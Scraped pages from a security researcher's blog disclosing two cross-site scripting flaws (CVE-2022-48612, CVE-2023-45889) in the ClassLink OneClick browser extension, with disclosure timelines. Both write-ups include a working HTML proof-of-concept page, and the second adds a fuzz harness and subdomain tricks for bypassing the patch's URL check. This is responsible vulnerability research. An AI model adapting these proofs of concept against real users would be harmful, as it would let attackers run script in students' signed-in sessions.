=== Content from blog.zerdle.net_cdba85a1_20250115_191535.html ===
 [James Connolly's Blog](https://blog.zerdle.net)
# [Why I (Mostly) Like Matrix](https://blog.zerdle.net/matrix/)

 2024-07-18

An exploration of my mixed opinions towards the Matrix ecosystem.

 [Read moreÂ  â©ï¸](https://blog.zerdle.net/matrix/)
# [ClassLink OneClick Extension Part 3: Beating A Very Dead Horse](https://blog.zerdle.net/classlink3/)

 2024-06-11

An investigation of a new page on ClassLink's website.

 [Read moreÂ  â©ï¸](https://blog.zerdle.net/classlink3/)
# [ClassLink OneClick Extension Part 2: Electric Boogaloo (CVE-2023-45889)](https://blog.zerdle.net/classlink2/)

 2024-01-19

Finding a vulnerability in the patch to a vulnerability which I also discovered.

 [Read moreÂ  â©ï¸](https://blog.zerdle.net/classlink2/)
# [BuckeyeCTF 2023 web/area51 Writeup](https://blog.zerdle.net/buckeye2023_area51/)

 2023-10-07

This is how I solved the web/area51 challenge of BuckeyeCTF 2023.

 [Read moreÂ  â©ï¸](https://blog.zerdle.net/buckeye2023_area51/)
# [How I Found A Vulnerability in The ClassLink OneClick Extension (CVE-2022-48612)](https://blog.zerdle.net/classlink/)

 2022-12-16

This is the story of how I found a universal cross-site scripting vector in a browser extension used by over 10 million users.

 [Read moreÂ  â©ï¸](https://blog.zerdle.net/classlink/) Â© 2024 Powered by [Zola](https://www.getzola.org/) ::  Theme: [Terminimal](https://github.com/pawroman/zola-theme-terminimal/) by pawroman

=== Content from blog.zerdle.net_c55d7a4a_20250115_191536.html ===
 [James Connolly's Blog](https://blog.zerdle.net)
# [How I Found A Vulnerability in The ClassLink OneClick Extension (CVE-2022-48612)](https://blog.zerdle.net/classlink/)

 2022-12-16

This is the story of how I found a universal cross-site scripting vector in a browser extension used by over 10 million users.

# Introduction

I could immediately tell I would find something as soon as my school rolled out the extension, and once I saw the permissions it requested, I knew I would find something *extra* spicy.![ClassLink OneClick Extension permissions](/classlink/permissions.jpg)

the inability to disable the extension and high privileges were motivating factors in this research

# What Is This Extension?

This extension is designed to work in tandem with ClassLink LaunchPad which enables a student to select and automatically sign into educational websites. School IT staff load their students' credentials into LaunchPad's admin console; later, when a student clicks a website on LaunchPad, it sends their credentials to the extension which signs them in.
# Suspicious Function

While Scrolling through a pretty-printed version of `injected.js`, part of the code immediately attracted my attention.

![suspicious code section](/classlink/sus.jpg)
## Confusion

Why would this extension need to inject scripts into the DOM? It turns out that this is actually the primary pattern behind the whole extension. There is a bit of JavaScript for each website they integrate with that is responsible for logging a user in. ClassLink LaunchPad connects to over 6,000 websites, so I can understand why the flexibility of running unique JavaScript for each site becomes appealing.
## How Can We Exploit This?

It would be possible to exploit the `e` function if we can control `appResponse.pre_auth_script` and the window location. This would enable an attacker to inject any script into any page, in other words, universal cross-site scripting.
# Backtracking

Following the code backwards, I found that the `e` function is called from an event listener.

![message listener which calls suspicious code](/classlink/handle-sso.jpg)

At first this looks trivially exploitable by sending a `handle-sso` message from a webpage. Unfortunately for an attacker, `chrome.runtime.onMessage` has protections against this. Here is a section from [Message Passing (Chrome Developers)](https://developer.chrome.com/docs/extensions/mv2/messaging/).

![article section from Chrome Developers](/classlink/messages_from_webpages.jpg)

In order to send a message to this listener, the extension would need to have an attacker-controlled domain in their `manifest.json`, which effectively closes off this route of exploitation.
## Sending "handle-sso"

Because `externally_connectable` is not in `manifest.json`, we know that `handle-sso` messages can be only be sent from `background.js`. Searching for `handle-sso` in `background.js` yields this event listener:

![sending "handle-sso" message when a new tab is opened](/classlink/send-handle-sso.jpg)

A `handle-sso` message is sent when a new tab is opened, but the listener is created only after `background.js` receives an `initiate-sso` message. This message is sent by the following function in `injected.js`:

![function that sends "initiate-sso" message](/classlink/send-initiate-sso.jpg)

This `s` function takes in a parameter that's passed into the `initiate-sso` message, so calling `s` with user-controlled data is equivalent to universal cross-site scripting.

`s` is called here, but it's behind a regex that validates if the URL is controlled by ClassLink. However, this is not the only place that calls `s`â¦

![regex check before "initiate-sso" send function](/classlink/regex_guard.jpg)
# The Fundamental Flaw

The `s` function is also called here:

![duplicated from previous code but without the regex check](/classlink/clickhandle.jpg)

For whatever reason, there existed a mostly copied and pasted version of the previous code snippet which omits the regex check. This code registers click handler, but only for elements with two magic classes: `bg-info` and `js-uc`.

The failure to run the regex in this case is the root cause of this vulnerability. Putting carefully crafted data into the head of the document will allow us to control the parameters of `s` and, by proxy, get universal cross-site scripting.
# Creating a Proof of Concept

Here is the code for a proof of concept:
```
<html>
	<head>
		<title>ClassLink OneClick UXSS</title>
		<script>
			//appResponse: JSON.parse('{"userauth": [""], "pre_auth_script": "alert(window.location)"}'),
			//gwstokenMd5:{}
			setTimeout(function() {
				const button = document.getElementById("button");
				button.click();
				window.location.href = "https://example.com";
			}, 200);
		</script>
	</head>
	<body>
		<button id="button" class="bg-info js-uc" data-index="0">button of doom</button>
	</body>
</html>

```

In the body, there's a button with the two magic classes the click handler checks. The button also has `data-index="0"` and `appResponse` has `userauth` set as `[""]` to prevent an out of bounds array index. The `pre_auth_script` property of `appResponse` functions as the payload.
# Reporting

I was initially frustrated by the lack of official avenue to report vulnerabilities. I reported this vulnerability through the help desk, which made me a bit anxious me due to the possibility that details of my report could be intercepted by a third party. I advise that ClassLink adopts RFC 9116 (security.txt) to make it more clear to researchers where and how they should report vulnerabilities in the future.
## Timeline

* September 15th, 2022: vulnerability reported to ClassLink.* September 19th, 2022: I received an acknowledgement from ClassLink.* October 25th, 2022: I inquired about the status of a fix.* November 8th, 2022: I received notice that a patch would roll out on December 1st.* December 1st, 2022: The vulnerability was patched.

# Acknowledging Previous Research

I stumbled upon [research](https://seclists.org/fulldisclosure/2018/Jun/20) done in 2018 that was published on the Full Disclosure mailing list. They made eerily similar findings to me. The research from 2018 exploits the same function which injects scripts into the DOM, but with a different way of triggering it. I assume this research is responsible for the implementation of the URL regex check mentioned earlier in the article.
# Analysis of The Patch

The patch adds the regex guard to the `s` function. I tested my proof of concept code against the latest version and confirmed that it is sufficient to prevent exploitation.

![patched function that sends "initiate-sso" function](/classlink/patched_send-initiate-sso.jpg)

Thanks for reading! Read other posts?

---

  [BuckeyeCTF 2023 web/area51 WriteupÂ  â](https://blog.zerdle.net/buckeye2023_area51/)  Â© 2024 Powered by [Zola](https://www.getzola.org/) ::  Theme: [Terminimal](https://github.com/pawroman/zola-theme-terminimal/) by pawroman

=== Content from blog.zerdle.net_ec94b2b4_20250115_191534.html ===
 [James Connolly's Blog](https://blog.zerdle.net)
# [ClassLink OneClick Extension Part 2: Electric Boogaloo (CVE-2023-45889)](https://blog.zerdle.net/classlink2/)

 2024-01-19

Finding a vulnerability in the patch to a vulnerability which I also discovered.

# Introduction

In September 2022, I found a universal cross-site scripting vulnerability in the ClassLink OneClick Extension. I disclosed this vulnerability to ClassLink, and a patch was released a couple months later in December 2022. After the patch was released, I reverse engineered it. Although the proof of concept I sent along with my report no longer worked, the patch was incorrect.
# Analysis of The Patch (part 2)

> "I tested my proof of concept code against the latest version and confirmed that it is sufficient to prevent exploitation." (see my [previous post](https://blog.zerdle.net/classlink/#analysis-of-the-patch))

Although I tested the patched version against my proof of concept code from that post, the patch actually doesn't prevent exploitation in all cases. To understand why the patch is flawed, it's necessary to look at the regex `r` used to determine if an origin is allowed to initiate the single sign-on flow.

The definition of `r`:
```
r = "^https:\\/\\/(betalaunchpad\\.classlink\\.com|stagingclouddesktop\\.classlink\\.com|launchpad\\.classlink\\.com|my\\.classlink\\.eu|betamyapps\\.classlink\\.com|stagingmyapps\\.classlink\\.com|myapps\\.classlink\\.com|betateacherconsole\\.classlink\\.com|stagingteacherconsole\\.classlink\\.com|teacherconsole\\.classlink\\.com|betamybackpack\\.classlink\\.com|stagingmybackpack\\.classlink\\.com|mybackpack\\.classlink\\.com)";

```
![](/classlink/patched_send-initiate-sso.jpg)

patched function

# The Mistake

The mistake in the patch is that `r` fails to block specially crafted attacker controlled origins. In order to mitigate further attacks, ClassLink should use the browser's [URL API](https://developer.mozilla.org/en-US/docs/Web/API/URL). This will ensure there is no difference between the way the browser parses the URL and the way the extension parses it.
# Ways To Break The Regex

I wrote a fuzz harness to find interesting ways to break the regex. Testing against the actual regex used in the extension proved too slow, so I replaced it with `str::starts_with`. Although it's not exactly the same as the regex, it's close enough to find cases in which `r` is wrong. The code for the fuzz harness is as follows:
```
#![no_main]
use libfuzzer_sys::{fuzz_target, Corpus};
use url::{Url, Origin, Host};
fuzz_target!(|data: &[u8]| -> Corpus {
	let data = data.to_vec();
	if let Ok(valid_string) = String::from_utf8(data) {
		test_url(valid_string)
	} else {
		Corpus::Reject
	}
});
// a.b.com == betalaunchpad.classlink.com for the purposes of this fuzz target
// keeping the URL short makes fuzzing go faster
fn test_url(url: String) -> Corpus {
	if !url.starts_with("https://a.b.com") {
		return Corpus::Reject;
	}
	if let Ok(parsed_url) = Url::parse(&url) {
		if let Origin::Tuple(scheme, Host::Domain(host), _) = parsed_url.origin() {
			if scheme == "https" && (host == "example.com" || host.ends_with(".example.com")) {
				std::process::abort();
			}
		}
	}
	Corpus::Keep
}

```

Here are some interesting cases the fuzzer found:
## Exhibit A:

> https://betalaunchpad.classlink.com.example.com

It's perfectly valid to chain subdomains like this. If you place the same proof of concept code from my [previous post](https://blog.zerdle.net/classlink/#creating-a-proof-of-concept) on a subdomain like this, it renders the patch ineffective.
## Exhibit B:

> https://betalaunchpad.classlink.com@example.com

It's also valid to have "betalaunchpad.classlink.com" as the `userinfo` subcomponent of the URL. This particular example can't be exploited because browsers don't include `userinfo` in `window.location.origin`, but I felt compelled to include it because it was a neat edge case found by the fuzzer.
# Proof of Concept

The proof of concept is identical to CVE-2022-48612, but with the addition of the `selectors` part, which is required for exploitation on Edge.
```
<html>
  <head>
    <title>ClassLink OneClick UXSS</title>
    <script>
      //appResponse: JSON.parse('{"userauth": [""], "pre_auth_script": "alert(window.location)", "selectors": [""]}'),
      //gwstokenMd5:{}
      setTimeout(function() {
        const button = document.getElementById("button");
        button.click();
        window.location.href = "https://example.com";
      }, 200);
    </script>
  </head>
  <body>
    <button id="button" class="bg-info js-uc" data-index="0">button of doom</button>
  </body>
</html>

```
# Timeline

* January 14th, 2023: the vulnerability was reported to directly to ClassLink (through the email of an employee which I received during my previous report)* February 6th, 2023: I received confirmation that my report was received and was promised a remediation timeline when it becomes available* June 8th, 2023: I ask for the remediation timeline* June 28th, 2023: I am told a patch will be created "in the coming weeks"* July 10th, 2023: a patch was made, and according to ClassLink, it "will be available in the next 1-2 weeks" (it was not)* August 7th, 2023: I apply for two CVEs through Mitre (this issue, and the [previous issue](https://blog.zerdle.net/classlink/))* September 6th, 2023: I ask when the patch will be actually released (I am ignored)* October 2nd, 2023: I reach out to ClassLink's help desk* October 5th, 2023: the help desk responds and is under the impression the vulnerability is fixed; I respond and tell the representative that this is not the case* October 11th, 2023: the help desk tells me that the issue has been forwarded to the security team* October 15th, 2023: I am issued CVE-2022-48612 for the [first vulnerability](https://blog.zerdle.net/classlink/), and CVE-2023-45889 for this one.* January 19th, 2024: I release this post after no action from ClassLink

# Conclusion

I'll leave the moral of the story as an exercise for the reader...

Thanks for reading! Read other posts?

---

  [âÂ  BuckeyeCTF 2023 web/area51 Writeup](https://blog.zerdle.net/buckeye2023_area51/)    [ClassLink OneClick Extension Part 3: Beating A Very Dead HorseÂ  â](https://blog.zerdle.net/classlink3/)  Â© 2024 Powered by [Zola](https://www.getzola.org/) ::  Theme: [Terminimal](https://github.com/pawroman/zola-theme-terminimal/) by pawroman
